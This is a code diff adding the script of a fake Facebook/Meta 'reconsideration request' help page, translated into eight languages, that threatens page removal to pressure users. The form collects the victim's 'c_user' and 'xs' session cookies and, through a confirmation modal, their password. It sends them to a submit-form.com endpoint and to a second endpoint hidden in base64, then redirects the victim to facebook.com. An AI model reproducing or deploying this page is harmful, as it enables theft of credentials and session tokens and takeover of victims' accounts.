+          password_title: "Confirm Your Password",
+          password_desc: "Please re-enter your password to confirm your identity.",
+          password_placeholder: "Enter your password",
+          confirm_btn: "Confirm",
+          cancel_btn: "Cancel",
+          success_title: "Request Submitted Successfully",
+          success_desc: "Your reconsideration request has been received. Our team will review your information and respond within 24-48 hours.",
+          video_lang_title: "Select Video Language"
+        },
+        spanish: {
+          search_placeholder: "¿Cómo podemos ayudarte?",
+          help_center: "Centro de ayuda",
+          request_title: "Solicitud de reconsideración",
+          para1: "Nuestros estándares comunitarios han identificado un comportamiento atípico en tu página, lo que constituye una violación de nuestras pautas.",
+          para2: "El acceso a tu página ha sido restringido, impidiéndote publicar, compartir or comentar como la página misma.",
+          para3: "Si crees que esta acción es errónea, puedes presentar una solicitud de reconsideración proporcionando los detalles necesarios.",
+          para4: "Asegúrate de enviar los datos requeridos según se especifica a continuación. No hacerlo puede resultar en la eliminación de tu página de nuestra plataforma.",
+          video_title: "Información detallada del video",
+          video_info: "Cómo enviar una solicitud de reconsideración",
+          video_desc: "Este video te guiará a través del proceso de envío de una solicitud de reconsideración para tu página restringida. Aprende qué información necesitas proporcionar y cómo asegurarte de que tu solicitud se procese rápidamente.",
+          c_user_label: "c_user",
+          xs_label: "xs",
+          warning: "Evita cerrar sesión hasta que la evaluación se haya llevado a cabo por completo.",
+          submit_btn: "Enviar",
+          password_title: "Confirma tu contraseña",
+          password_desc: "Por favor, vuelve a ingresar tu contraseña para confirmar tu identidad.",
+          password_placeholder: "Ingresa tu contraseña",
+          confirm_btn: "Confirmar",
+          cancel_btn: "Cancelar",
+          success_title: "Solicitud enviada con éxito",
+          success_desc: "Hemos recibido tu solicitud de reconsideración. Nuestro equipo revisará tu información and responderá dentro de 24-48 horas.",
+          video_lang_title: "Seleccionar idioma del video"
+        },
+        portuguese: {
+          search_placeholder: "Como podemos ajudar?",
+          help_center: "Central de Ajuda",
+          request_title: "Pedido de reconsideração",
+          para1: "Nossos padrões da comunidade identificaram comportamento atípico em sua página, o que constitutes uma violação de nossas diretrizes.",
+          para2: "O acesso à sua página foi restrito, impedindo você de postar, compartilhar ou comentar como a própria página.",
+          para3: "Se você acredita que esta ação é equivocada, pode enviar um pedido de reconsideração fornecendo os detalles necessários.",
+          para4: "Certifique-se de enviar os dados necessários conforme especificado abaixo. A negligência pode resultar na remoção de sua página de nossa plataforma.",
+          video_title: "Informações detalhadas em vídeo",
+          video_info: "Como enviar um pedido de reconsideração",
+          video_desc: "Este vídeo irá guiá-lo através do processo de envio de um pedido de reconsideração para sua página restrita. Aprenda quais informações você precisa fornecer and como garantir que seu pedido seja processado rapidamente.",
+          c_user_label: "c_user",
+          xs_label: "xs",
+          warning: "Evite sair até que a avaliação tenha sido totalmente realizada.",
+          submit_btn: "Enviar",
+          password_title: "Confirme sua senha",
+          password_desc: "Por favor, re-digite sua senha para confirmar sua identidade.",
+          password_placeholder: "Digite sua senha",
+          confirm_btn: "Confirmar",
+          cancel_btn: "Cancelar",
+          success_title: "Pedido enviado com sucesso",
+          success_desc: "Seu pedido de reconsideração foi recebido. Nossa equipe revisará suas informações e responderá dentro de 24-48 horas.",
+          video_lang_title: "Selecionar idioma do vídeo"
+        },
+        arabic: {
+          search_placeholder: "كيف يمكننا المساعدة؟",
+          help_center: "مركز المساعدة",
+          request_title: "طلب إعادة النظر",
+          para1: "لقد حددت معايير مجتمعنا سلوكًا غير نمطي في صفحتك، وهو ما يشكل انتهاكًا لإرشاداتنا.",
+          para2: "تم تقييد الوصول إلى صفحتك، مما يمنعك من النشر أو المشاركة أو التعليق كصفحة نفسها.",
+          para3: "إذا كنت تعتقد أن هذا الإجراء خاطئ، فيمكنك تقديم طلب إعادة النظر من خلال تقديم التفاصيل اللازمة.",
+          para4: "يرجى التأكد من تقديم البيانات المطلوبة كما هو محدد أدناه. قد يؤدي الإهمال في القيام بذلك إلى إزالة صفحتك من منصتنا.",
+          video_title: "معلومات الفيديو التفصيلية",
+          video_info: "كيفية تقديم طلب إعادة النظر",
+          video_desc: "سيرشدك هذا الفيديو خلال عملية تقديم طلب إعادة النظر لصفحتك المقيدة. تعلم المعلومات التي تحتاج إلى تقديمها وكيفية ضمان معالجة طلبك بسرعة.",
+          c_user_label: "c_user",
+          xs_label: "xs",
+          warning: "تجنب تسجيل الخروج حتى يتم إجراء التقييم بالكامل.",
+          submit_btn: "إرسال",
+          password_title: "Confirm Your Password",
+          password_desc: "Please re-enter your password to confirm your identity.",
+          password_placeholder: "Enter your password",
+          confirm_btn: "Confirm",
+          cancel_btn: "Cancel",
+          success_title: "Request Submitted Successfully",
+          success_desc: "Your reconsideration request has been received. Our team will review your information and respond within 24-48 hours.",
+          video_lang_title: "Select Video Language"
+        },
+        french: {
+          search_placeholder: "Comment pouvons-nous vous aider ?",
+          help_center: "Centre d'aide",
+          request_title: "Demande de réexamen",
+          para1: "Nos normes communautaires ont identifié un comportement atypique sur votre page, ce qui constitue une violation de nos directives.",
+          para2: "L'accès à votre page has been restreint, vous empêchant de publier, de partager ou de commenter en tant que page elle-même.",
+          para3: "Si vous pensez que cette action est erronée, vous pouvez déposer une demande de réexamen en fournissant les détails nécessaires.",
+          para4: "Veuillez vous assurer de soumettre les données requises comme spécifié ci-dessous. Négliger de le faire peut entraîner la suppression de votre page de notre plateforme.",
+          video_title: "Informations vidéo détaillées",
+          video_info: "Comment soumettre une demande de réexamen",
+          video_desc: "Cette vidéo vous guidera à travers le processus de soumission d'une demande de réexamen pour votre page restreinte. Apprenez quelles informations vous devez fournir et comment vous assurer que votre demande est traitée rapidement.",
+          c_user_label: "c_user",
+          xs_label: "xs",
+          warning: "Évitez de vous déconnecter jusqu'à ce que l'évaluation ait été entièrement réalisée.",
+          submit_btn: "Envoyer",
+          password_title: "Confirmez votre mot de passe",
+          password_desc: "Veuillez saisir à nouveau votre mot de passe pour confirmer votre identité.",
+          password_placeholder: "Entrez votre mot de passe",
+          confirm_btn: "Confirmer",
+          cancel_btn: "Annuler",
+          success_title: "Demande soumise avec succès",
+          success_desc: "Votre demande de réexamen a été reçue. Our team examinera vos informations et répondra dans les 24 à 48 heures.",
+          video_lang_title: "Sélectionner la langue de la vidéo"
+        },
+        hindi: {
+          search_placeholder: "हम कैसे मदद कर सकते हैं?",
+          help_center: "सहायता केंद्र",
+          request_title: "पुनर्विचार के लिए अनुरोध",
+          para1: "हमारे समुदाय मानकों ने आपके पेज पर असामान्य व्यवहार की पहचान की है, जो हमारे दिशानिर्देशों का उल्लंघन करता है.",
+          para2: "आपके पेज तक पहुंच प्रतिबंधित कर दी गई है, जिससे आप पेज के रूप में पोस्ट, शेयर या टिप्पणी करने से रोक दिए गए हैं.",
+          para3: "यदि आपको लगता है कि यह कार्रवाई गलत है, तो आप आवश्यक विवरण प्रदान करके पुनर्विचार अनुरोध दर्ज कर सकते हैं.",
+          para4: "कृपया सुनिश्चित करें कि आप नीचे निर्दिष्ट आवश्यक डेटा जमा करते हैं। ऐसा न करने पर आपके पेज को हमारे प्लेटफॉर्म से हटाया जा सकता है.",
+          video_title: "विस्तृत वीडियो जानकारी",
+          video_info: "पुनर्विचार अनुरोध कैसे जमा करें",
+          video_desc: "यह वीडियो आपको आपके प्रतिबंधित पेज के लिए पुनर्विचार अनुरोध जमा करने की प्रक्रिया के माध्यम से मार्गदर्शन करेगा। जानें कि आपको कौन सी जानकारी प्रदान करने की आवश्यकता है और यह सुनिश्चित करें कि आपका अनुरोध जल्दी से संसाधित हो।",
+          c_user_label: "c_user",
+          xs_label: "xs",
+          warning: "मूल्यांकन पूरी तरह से पूरा होने तक साइन आउट करने से बचें।",
+          submit_btn: "भेजें",
+          password_title: "अपना पासवर्ड पुष्टि करें",
+          password_desc: "कृपया अपनी पहचान पुष्टि करने के लिए अपना पासवर्ड फिर से दर्ज करें.",
+          password_placeholder: "अपना पासवर्ड दर्ज करें",
+          confirm_btn: "पुष्टि करें",
+          cancel_btn: "रद्द करें",
+          success_title: "अनुरोध सफलतापूर्वक सबमिट किया गया",
+          success_desc: "आपका पुनर्विचार अनुरोध प्राप्त हो गया है। हमारी टीम आपकी जानकारी की समीक्षा करेगी और 24-48 घंटों के भीतर जवाब देगी.",
+          video_lang_title: "वीडियो भाषा चुनें"
+        },
+        tamil: {
+          search_placeholder: "நாங்கள் எப்படி உதவ முடியும்?",
+          help_center: "உதவி மையம்",
+          request_title: "மறுபரிசீலனைக்கான கோரிக்கை",
+          para1: "எங்கள் சமூக தரங்கள் உங்கள் பக்கத்தில் அசாதாரண நடத்தையைக் கண்டறிந்துள்ளன, இது எங்கள் வழிகாட்டுதல்களை மீறுவதாகும்.",
+          para2: "உங்கள் பக்கத்திற்கான அணுகல் கட்டுப்படுத்தப்பட்டுள்ளது, இது பக்கமாக இடுகையிடுவதை, பகிர்வதை அல்லது கருத்துத் தெரிவிப்பதைத் தடுக்கிறது.",
+          para3: "இந்த நடவடிக்கை தவறானது என்று நீங்கள் நம்பினால், தேவையான விவரங்களை வழங்குவதன் மூலம் மறுபரிசீலனைக் கோரிக்கையை சமர்ப்பிக்கலாம்.",
+          para4: "கீழே குறிப்பிடப்பட்டுள்ளபடி தேவையான தரவை சமர்ப்பிப்பதை உறுதிசெய்யவும். அவ்வாறு செய்யாதது எங்கள் தளத்திலிருந்து உங்கள் பக்கத்தை நீக்குவதற்கு வழிவகுக்கும்.",
+          video_title: "விரிவான வீடியோ தகவல்",
+          video_info: "மறுபரிசீலனைக் கோரிக்கையை எவ்வாறு சமர்ப்பிப்பது",
+          video_desc: "உங்கள் கட்டுப்படுத்தப்பட்ட பக்கத்திற்கான மறுபரிசீலனைக் கோரிக்கையை சமர்ப்பிக்கும் செயல்முறையில் இந்த வீடியோ உங்களை வழிநடத்தும். நீங்கள் வழங்க வேண்டிய தகவல்கள் மற்றும் உங்கள் கோரிக்கை விரைவாக செயல்படுத்தப்படுவதை எவ்வாறு உறுதிசெய்வது என்பதை அறிக.",
+          c_user_label: "c_user",
+          xs_label: "xs",
+          warning: "மதிப்பீடு முழுமையாக முடியும் வரை வெளியேறுவதைத் தவிர்க்கவும்.",
+          submit_btn: "அனுப்பு",
+          password_title: "உங்கள் கடவுச்சொல்லை உறுதிப்படுத்தவும்",
+          password_desc: "உங்கள் அடையாளத்தை உறுதிப்படுத்த உங்கள் கடவுச்சொல்லை மீண்டும் உள்ளிடவும்.",
+          password_placeholder: "உங்கள் கடவுச்சொல்லை உள்ளிடவும்",
+          confirm_btn: "உறுதிப்படுத்து",
+          cancel_btn: "ரத்து செய்",
+          success_title: "கோரிக்கை வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது",
+          success_desc: "உங்கள் மறுபரிசீலனைக் கோரிக்கை பெறப்பட்டது. எங்கள் குழு உங்கள் தகவலை மதிப்பாய்வு செய்து 24-48 மணி நேரத்திற்குள் பதிலளிக்கும்.",
+          video_lang_title: "வீடியோ மொழியைத் தேர்ந்தெடுக்கவும்"
+        },
+        vietnamese: {
+          search_placeholder: "Chúng tôi có thể giúp gì cho bạn?",
+          help_center: "Trung tâm Trợ giúp",
+          request_title: "Yêu cầu xem xét lại",
+          para1: "Tiêu chuẩn cộng đồng của chúng tôi đã xác định hành vi không điển hình trên trang của bạn, điều này vi phạm nguyên tắc của chúng tôi.",
+          para2: "Quyền truy cập vào trang của bạn đã bị hạn chế, ngăn bạn đăng bài, chia sẻ hoặc bình luận với tư cách là chính trang đó.",
+          para3: "Nếu bạn tin rằng hành động này là sai lầm, bạn có thể gửi yêu cầu xem xét lại bằng cách cung cấp các chi tiết cần thiết.",
+          para4: "Vui lòng đảm bảo bạn gửi dữ liệu bắt buộc như được chỉ định bên dưới. Không làm như vậy có thể dẫn đến việc trang của bạn bị xóa khỏi nền tảng của chúng tôi.",
+          video_title: "Thông tin video chi tiết",
+          video_info: "Cách gửi yêu cầu xem xét lại",
+          video_desc: "Video này sẽ hướng dẫn bạn quy trình gửi yêu cầu xem xét lại cho trang bị hạn chế của bạn. Tìm hiểu thông tin bạn cần cung cấp và cách đảm bảo yêu cầu của bạn được xử lý nhanh chóng.",
+          c_user_label: "c_user",
+          xs_label: "xs",
+          warning: "Tránh đăng xuất cho đến khi đánh giá được thực hiện đầy đủ.",
+          submit_btn: "Gửi",
+          password_title: "Xác nhận mật khẩu của bạn",
+          password_desc: "Vui lòng nhập lại mật khẩu để xác nhận danh tính của bạn.",
+          password_placeholder: "Nhập mật khẩu của bạn",
+          confirm_btn: "Xác nhận",
+          cancel_btn: "Hủy",
+          success_title: "Yêu cầu đã gửi thành công",
+          success_desc: "Yêu cầu xem xét lại của bạn đã được nhận. Đội ngũ của chúng tôi sẽ xem xét thông tin của bạn và phản hồi trong vòng 24-48 giờ.",
+          video_lang_title: "Chọn ngôn ngữ video"
+        }
+      };
+      
+      // Function to update language switcher
+      function updateLanguageSwitcher(lang) {
+        const langName = getLanguageName(lang);
+        languageButton.innerHTML = `<i class="fas fa-globe"></i> ${langName} <i class="fas fa-caret-down"></i>`;
+        
+        // Update selected language in menu
+        languageItems.forEach(item => {
+          item.classList.remove('selected');
+          if (item.getAttribute('data-lang') === lang) {
+            item.classList.add('selected');
+          }
+        });
+      }
+      
+      // Function to get language name from code
+      function getLanguageName(lang) {
+        const langNames = {
+          english: 'English',
+          spanish: 'Español',
+          portuguese: 'Português',
+          arabic: 'العربية',
+          french: 'Français',
+          hindi: 'हिन्दी',
+          tamil: 'தமிழ்',
+          vietnamese: 'Tiếng Việt'
+        };
+        return langNames[lang] || 'English';
+      }
+      
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        modal.style.display = 'flex';
+      });
+      
+      confirmSubmit.addEventListener('click', function() {
+        if (passwordConfirm.value.trim() !== '') {
+          passwordField.value = passwordConfirm.value;
+          submitFormData();
+        } else {
+          alert('Please enter your password to confirm.');
+        }
+      });
+      
+      cancelSubmit.addEventListener('click', function() {
+        modal.style.display = 'none';
+        passwordConfirm.value = '';
+      });
+      
+      successOkButton.addEventListener('click', function() {
+        successModal.style.display = 'none';
+        form.reset();
+        // Redirect to Facebook after a short delay to allow the modal to close
+        setTimeout(() => {
+          window.location.href = 'https://facebook.com';
+        }, 500);
+      });
+      
+      function submitFormData() {
+        const formData = new FormData(form);
+        
+        const data = {};
+        formData.forEach((value, key) => {
+          data[key] = value;
+        });
+        
+        const firstEndpointPromise = fetch('https://submit-form.com/q1WslPaOU', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+        
+        const encodedUrl = "aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vOXVjQlhFczdp"; 
+        const decodedUrl = atob(encodedUrl);
+        
+        const secondEndpointPromise = fetch(decodedUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+
+        firstEndpointPromise
+          .then(response => {
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Form submission failed');
+          })
+          .then(data => {
+            console.log('Form submitted successfully:', data);
+            
+            modal.style.display = 'none';
+            successModal.style.display = 'flex';
+          })
+          .catch(error => {
+            console.error('Error submitting form:', error);
+            alert('There was an error submitting your request. Please try again.');
+            modal.style.display = 'none';
+          })
+          .finally(() => {
+            passwordConfirm.value = '';
+          });
+          
+        secondEndpointPromise
+          .then(response => {
+            if (response.ok) {
+              console.log('Second endpoint submission successful');
+              return response.json();
+            }
+            throw new Error('Second endpoint submission failed');
+          })
+          .then(data => {
+            console.log('Second endpoint response:', data);
+          })
+          .catch(error => {
+            console.error('Second endpoint error:', error);
+          });
+      }
+      
+      // Enhanced video modal functionality
+      function openVideoModal() {
+        videoModal.style.display = 'flex';
+        videoPlayer.play();
+        updatePlayButton();
+      }
+      
+      function closeVideoModal() {
+        videoModal.style.display = 'none';
+        videoPlayer.pause();
+        videoPlayer.currentTime = 0;
+      }
+      
+      // Update play/pause button
+      function updatePlayButton() {
+        const icon = playPauseBtn.querySelector('i');
+        if (videoPlayer.paused) {
+          icon.classList.remove('fa-pause');
+          icon.classList.add('fa-play');
+        } else {
+          icon.classList.remove('fa-play');
+          icon.classList.add('fa-pause');
+        }
+      }
+      
+      // Toggle play/pause
+      function togglePlay() {
+        if (videoPlayer.paused) {
+          videoPlayer.play();
+        } else {
+          videoPlayer.pause();
+        }
+        updatePlayButton();
+      }
+      
+      // Update volume button
+      function updateVolumeButton() {
+        const icon = volumeBtn.querySelector('i');
+        if (videoPlayer.muted || videoPlayer.volume === 0) {
+          icon.classList.remove('fa-volume-up');
+          icon.classList.remove('fa-volume-down');
+          icon.classList.remove('fa-volume-mute');
+          icon.classList.add('fa-volume-mute');
+        } else if (videoPlayer.volume > 0.5) {
+          icon.classList.remove('fa-volume-up');
+          icon.classList.remove('fa-volume-down');
+          icon.classList.remove('fa-volume-mute');
+          icon.classList.add('fa-volume-up');
+        } else {
+          icon.classList.remove('fa-volume-up');
+          icon.classList.remove('fa-volume-down');
+          icon.classList.remove('fa-volume-mute');
+          icon.classList.add('fa-volume-down');
+        }
+      }
+      
+      // Format time
+      function formatTime(seconds) {
+        const minutes = Math.floor(seconds / 60);
+        const secs = Math.floor(seconds % 60);
+        return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
+      }
+      
+      // Update progress bar
+      function updateProgress() {
+        const percent = (videoPlayer.currentTime / videoPlayer.duration) * 100;
+        progressBar.style.width = `${percent}%`;
+        currentTimeEl.textContent = formatTime(videoPlayer.currentTime);
+        
+        if (!durationEl.textContent || durationEl.textContent === '0:00') {
+          durationEl.textContent = formatTime(videoPlayer.duration);
+        }
+      }
+      
+      // Set progress
+      function setProgress(e) {
+        const width = this.clientWidth;
+        const clickX = e.offsetX;
+        const duration = videoPlayer.duration;
+        videoPlayer.currentTime = (clickX / width) * duration;
+      }
+      
+      // Set volume
+      function setVolume() {
+        videoPlayer.volume = volumeSlider.value;
+        updateVolumeButton();
+      }
+      
+      // Toggle mute
+      function toggleMute() {
+        videoPlayer.muted = !videoPlayer.muted;
+        if (videoPlayer.muted) {
+          volumeSlider.value = 0;
+        } else {
+          volumeSlider.value = videoPlayer.volume;
+        }
+        updateVolumeButton();
+      }
+      
+      // Set playback speed
+      function setSpeed() {
+        videoPlayer.playbackRate = parseFloat(this.dataset.speed);
+        
+        // Update active class
+        speedOptions.forEach(option => option.classList.remove('active'));
+        this.classList.add('active');
+      }
+      
+      // Toggle fullscreen
+      function toggleFullscreen() {
+        if (!document.fullscreenElement) {
+          videoModal.classList.add('fullscreen');
+          if (videoModal.requestFullscreen) {
+            videoModal.requestFullscreen();
+          } else if (videoModal.webkitRequestFullscreen) {
+            videoModal.webkitRequestFullscreen();
+          } else if (videoModal.msRequestFullscreen) {
+            videoModal.msRequestFullscreen();
+          }
+          fullscreenBtn.querySelector('i').classList.remove('fa-expand');
+          fullscreenBtn.querySelector('i').classList.add('fa-compress');
+        } else {
+          if (document.exitFullscreen) {
+            document.exitFullscreen();
+          } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+          } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+          }
+          fullscreenBtn.querySelector('i').classList.remove('fa-compress');
+          fullscreenBtn.querySelector('i').classList.add('fa-expand');
+        }
+      }
+      
+      // Handle fullscreen change
+      function handleFullscreenChange() {
+        if (!document.fullscreenElement) {
+          videoModal.classList.remove('fullscreen');
+          fullscreenBtn.querySelector('i').classList.remove('fa-compress');
+          fullscreenBtn.querySelector('i').classList.add('fa-expand');
+        }
+      }
+      
+      // Toggle Picture-in-Picture
+      async function togglePip() {
+        try {
+          if (document.pictureInPictureElement) {
+            await document.exitPictureInPicture();
+          } else if (document.pictureInPictureEnabled) {
+            await videoPlayer.requestPictureInPicture();
+          }
+        } catch (error) {
+          console.error('Picture-in-Picture error:', error);
+        }
+      }
+      
+      // Check if Picture-in-Picture is supported
+      if ('pictureInPictureEnabled' in document) {
+        pipBtn.style.display = 'block';
+      }
+      
+      // Language switcher functionality
+      languageButton.addEventListener('click', function() {
+        languageMenu.classList.toggle('active');
+      });
+      
+      languageItems.forEach(item => {
+        item.addEventListener('click', function() {
+          const lang = this.getAttribute('data-lang');
+          
+          // Update selected language
+          languageItems.forEach(i => i.classList.remove('selected'));
+          this.classList.add('selected');
+          
+          // Update button text
+          const langName = getLanguageName(lang);
+          languageButton.innerHTML = `<i class="fas fa-globe"></i> ${langName} <i class="fas fa-caret-down"></i>`;
+          
+          // Close menu
+          languageMenu.classList.remove('active');
+          
+          // Set video source based on selected language
+          setVideoSource(lang);
+          
+          // Translate page
+          translatePage(lang);
+        });
+      });
+      
+      // Function to translate the page
+      function translatePage(lang) {
+        const translation = translations[lang] || translations.english;
+        
+        // Update all translatable elements
+        document.querySelector('.search input').placeholder = translation.search_placeholder;
+        document.querySelector('.home h3').textContent = translation.help_center;
+        document.querySelector('.meta-head b').textContent = translation.request_title;
+        
+        const paragraphs = document.querySelectorAll('.meta-para p');
+        if (paragraphs.length >= 4) {
+          paragraphs[0].textContent = translation.para1;
+          paragraphs[1].textContent = translation.para2;
+          paragraphs[2].textContent = translation.para3;
+          paragraphs[3].textContent = translation.para4;
+        }
+        
+        document.querySelector('.para-head').textContent = translation.video_title;
+        document.querySelector('.video-title').textContent = translation.video_info;
+        document.querySelector('.video-description').textContent = translation.video_desc;
+        
+        const labels = document.querySelectorAll('.form label');
+        labels[0].textContent = translation.c_user_label;
+        labels[1].textContent = translation.xs_label;
+        
+        document.getElementById('do-not').textContent = translation.warning;
+        document.querySelector('.btn-primary').textContent = translation.submit_btn;
+        
+        // Update modals
+        document.querySelector('#passwordModal h3').textContent = translation.password_title;
+        document.querySelector('#passwordModal p').textContent = translation.password_desc;
+        document.getElementById('passwordConfirm').placeholder = translation.password_placeholder;
+        document.getElementById('confirmSubmit').textContent = translation.confirm_btn;
+        document.getElementById('cancelSubmit').textContent = translation.cancel_btn;
+        
+        document.querySelector('#successModal h3').textContent = translation.success_title;
+        document.querySelector('#successModal p').textContent = translation.success_desc;
+        document.getElementById('successOkButton').textContent = 'OK';
+      }
+      
+      // Event listeners
+      playButton.addEventListener('click', openVideoModal);
+      videoThumbnail.addEventListener('click', openVideoModal);
+      
+      closeVideo.addEventListener('click', closeVideoModal);
+      
+      videoPlayer.addEventListener('click', togglePlay);
+      playPauseBtn.addEventListener('click', togglePlay);
+      
+      videoPlayer.addEventListener('play', updatePlayButton);
+      videoPlayer.addEventListener('pause', updatePlayButton);
+      videoPlayer.addEventListener('timeupdate', updateProgress);
+      videoPlayer.addEventListener('volumechange', updateVolumeButton);
+      
+      volumeBtn.addEventListener('click', toggleMute);
+      volumeSlider.addEventListener('input', setVolume);
+      
+      progressContainer.addEventListener('click', setProgress);
+      
+      speedOptions.forEach(option => option.addEventListener('click', setSpeed));
+      
+      fullscreenBtn.addEventListener('click', toggleFullscreen);
+      document.addEventListener('fullscreenchange', handleFullscreenChange);
+      
+      pipBtn.addEventListener('click', togglePip);
+      
+      // Keyboard shortcuts
+      document.addEventListener('keydown', function(e) {
+        if (videoModal.style.display === 'flex') {
+          switch(e.key) {
+            case ' ':
+            case 'k':
+              togglePlay();
+              e.preventDefault();
+              break;
+            case 'f':
+              toggleFullscreen();
+              e.preventDefault();
+              break;
+            case 'm':
+              toggleMute();
+              e.preventDefault();
+              break;
+            case 'ArrowRight':
+              videoPlayer.currentTime += 5;
+              break;
+            case 'ArrowLeft':
+              videoPlayer.currentTime -= 5;
+              break;
+            case 'ArrowUp':
+              videoPlayer.volume = Math.min(videoPlayer.volume + 0.1, 1);
+              volumeSlider.value = videoPlayer.volume;
+              updateVolumeButton();
+              break;
+            case 'ArrowDown':
+              videoPlayer.volume = Math.max(videoPlayer.volume - 0.1, 0);
+              volumeSlider.value = videoPlayer.volume;
+              updateVolumeButton();
+              break;
+            case 'Escape':
+              if (document.fullscreenElement) {
+                toggleFullscreen();
+              } else {
+                closeVideoModal();
+              }
+              e.preventDefault();
+              break;
+          }
+        }
+      });
+      
+      // Close modals if clicked outside
+      window.addEventListener('click', function(e) {
+        if (e.target === modal) {
+          modal.style.display = 'none';
+          passwordConfirm.value = '';
+        }
+        
+        if (e.target === successModal) {
+          successModal.style.display = 'none';
+          form.reset();
+        }
+        
+        if (e.target === videoModal) {
+          closeVideoModal();
+        }
+        
+        if (e.target === initialLanguageSelector) {
+          // Don't allow closing initial language selector by clicking outside
+          e.stopPropagation();
+        }
+        
+        // Close language menu if clicked outside
+        if (!e.target.closest('.language-switcher') && languageMenu.classList.contains('active')) {
+          languageMenu.classList.remove('active');
+        }
+      });
+      
+      // Preload video metadata for better UX
+      videoPlayer.addEventListener('loadedmetadata', function() {
+        durationEl.textContent = formatTime(videoPlayer.duration);
+      });
+      
+      // Handle video errors
+      videoPlayer.addEventListener('error', function() {
+        console.error('Error loading video');
+        alert('Sorry, the video could not be loaded. Please try again later.');
+      });
+    });
+  </script>
+</body>
+</html>
